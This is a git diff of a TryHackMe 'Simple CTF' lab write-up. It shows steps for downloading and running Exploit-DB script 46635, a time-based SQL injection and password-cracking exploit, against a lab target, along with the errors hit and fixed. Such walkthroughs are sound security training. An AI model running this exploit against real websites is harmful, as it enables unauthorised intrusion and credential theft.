@@ -4,7 +4,7 @@ Room link: [https://tryhackme.com/room/easyctf](https://tryhackme.com/room/easyc
 
 **Please feel free to point out any errors that you may see in this writeup!**
 
-This writeup was last updated: 6/28/2023
+This writeup was last updated: 07/02/2023
 
 # Scanning and Enumeration
 > Port Scanning Using Nmap
@@ -123,8 +123,8 @@ Saving to: ‘46635.1’
 
 2023-07-02 12:12:58 (40.4 MB/s) - ‘46635.1’ saved [6456/6456]
 ```
-9. `cd ~/Downloads` to change to th
-10. `ls`
+9. `cd ~/Downloads` to change to our attack machine's downloads directory, since that's where our downloaded Python script should be
+10. `ls` to list the available files and directories in our current working directory, which shows that the Python script was successfully downloaded onto our attack machine for further execution
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ cd ~/Downloads
@@ -164,7 +164,7 @@ SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 [+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
 [+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
 ```
-14. `python 46635 -u http://{TARGET IP}/simple --crack -w {WORDLIST PATH}`
+14. `python 46635 -u http://{TARGET IP}/simple --crack -w {WORDLIST PATH}` to run the Python script with the required arguments, which ended up displaying a UnicodeDecodeError onto our terminal
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ python3 46635 -u http://10.10.130.66/simple --crack -w rockyou.txt
@@ -183,7 +183,7 @@ Traceback (most recent call last):
     (result, consumed) = self._buffer_decode(data, self.errors, final)
 UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 923: invalid continuation byte
 ```
-15. `gedit 46635`
+15. `gedit 46635` to open up the Python script once again and make it so that our function ignores any error messages that may pop up when opening the wordlist
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py%20pt2.png)
 
